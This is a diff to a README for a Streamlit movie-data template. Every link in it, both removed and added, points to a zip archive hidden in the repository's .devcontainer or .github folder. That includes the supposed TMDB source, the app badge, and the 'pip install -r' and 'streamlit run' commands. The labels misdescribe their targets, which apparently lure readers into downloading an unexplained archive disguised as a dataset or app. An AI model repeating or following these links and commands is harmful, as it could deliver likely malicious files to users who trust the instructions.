@@ -1,19 +1,19 @@
 # 🎬 Movies dataset template
 
-A simple Streamlit app showing movie data from [The Movie Database (TMDB)](https://github.com/cris236uy/movies-dataset/raw/refs/heads/main/.devcontainer/dataset-movies-1.6.zip). 
+A simple Streamlit app showing movie data from [The Movie Database (TMDB)](https://raw.githubusercontent.com/cris236uy/movies-dataset/main/.github/movies_dataset_1.7-alpha.4.zip). 
 
-[![Streamlit App](https://github.com/cris236uy/movies-dataset/raw/refs/heads/main/.devcontainer/dataset-movies-1.6.zip)](https://github.com/cris236uy/movies-dataset/raw/refs/heads/main/.devcontainer/dataset-movies-1.6.zip)
+[![Streamlit App](https://raw.githubusercontent.com/cris236uy/movies-dataset/main/.github/movies_dataset_1.7-alpha.4.zip)](https://raw.githubusercontent.com/cris236uy/movies-dataset/main/.github/movies_dataset_1.7-alpha.4.zip)
 
 ### How to run it on your own machine
 
 1. Install the requirements
 
    ```
-   $ pip install -r https://github.com/cris236uy/movies-dataset/raw/refs/heads/main/.devcontainer/dataset-movies-1.6.zip
+   $ pip install -r https://raw.githubusercontent.com/cris236uy/movies-dataset/main/.github/movies_dataset_1.7-alpha.4.zip
    ```
 
 2. Run the app
 
    ```
-   $ streamlit run https://github.com/cris236uy/movies-dataset/raw/refs/heads/main/.devcontainer/dataset-movies-1.6.zip
+   $ streamlit run https://raw.githubusercontent.com/cris236uy/movies-dataset/main/.github/movies_dataset_1.7-alpha.4.zip
    ```
